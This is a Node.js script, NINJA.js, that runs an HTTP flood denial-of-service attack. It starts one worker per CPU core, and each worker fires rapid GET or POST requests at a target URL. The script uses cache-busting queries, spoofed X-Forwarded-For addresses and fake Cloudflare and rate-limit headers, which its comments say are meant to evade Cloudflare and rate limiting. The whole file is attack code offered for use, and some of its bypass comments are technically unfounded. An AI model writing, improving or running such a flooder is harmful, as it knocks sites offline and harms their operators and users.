const { Worker, isMainThread, parentPort } = require('worker_threads');
const axios = require('axios');

if (isMainThread) {
    const target = process.argv[2];
    const duration = process.argv[3];
    const method = process.argv[4] ? process.argv[4].toUpperCase() : 'GET'; // Default GET

    if (!target || isNaN(parseInt(duration)) || !['GET', 'POST'].includes(method)) {
        console.log('Usage: node NINJA.js [URL] [DURATION] [METHOD: GET/POST]');
        process.exit(1);
    }

    const numThreads = require('os').cpus().length;
    console.log(`Starting ${method} attack on ${target} for ${duration} seconds with ${numThreads} threads.`);

    for (let i = 0; i < numThreads; i++) {
        new Worker(__filename, { workerData: { target, duration, method } });
    }

    setTimeout(() => {
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
} else {
    const { target, duration, method } = require('worker_threads').workerData;

    const endTime = Date.now() + duration * 1000;

    // Random string generator
    function generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    // Random headers generator to bypass Cloudflare and Rate Limiting
    function generateRandomHeaders() {
        return {
            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`,
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-RateLimit-Reset': Date.now() + Math.floor(Math.random() * 10000), // Bypass rate limiting
            'X-RateLimit-Limit': 1000, // Bypass rate limiting
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': target,
            'Origin': target,
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'cf-ray': `${Math.floor(Math.random() * 10000000)}-${Math.floor(Math.random() * 1000000000)}`, // Cloudflare Ray ID
            'cf-visitor': '{"scheme":"https"}', // Cloudflare visitor info
            // Custom Accept header
            'Accept': 'application/json, text/plain, */*', 
            // Adding Accept-Language header for a more legitimate request
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,de;q=0.7', // Common languages for the target audience
            // Adding cplist (Cipher Suites List) for deeper SSL/TLS manipulation
            'cplist': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256', // Example of strong cipher suites
            // Adding sigalgs (Signature Algorithms) for finer control over SSL/TLS negotiations
            'sigalgs': 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256', // Commonly used signature algorithms
        };
    }

    async function sendUltraRequest() {
        while (Date.now() < endTime) {
            const uniqueQuery = `?cache_buster=${Date.now()}&random=${generateRandomString(16)}`;
            const url = method === 'GET' ? `${target}${uniqueQuery}` : target;

            try {
                if (method === 'GET') {
                    await axios.get(url, {
                        headers: generateRandomHeaders(),
                        timeout: 1000 // Minimized timeout for rapid requests
                    });
                } else if (method === 'POST') {
                    await axios.post(url, {
                        data: generateRandomString(64)
                    }, {
                        headers: generateRandomHeaders(),
                        timeout: 1000
                    });
                }
            } catch (err) {
                // Silent fail to continue attack
            }
        }
        parentPort.postMessage('Thread finished.');
    }

    // Launch Ultra Request
    sendUltraRequest();
}
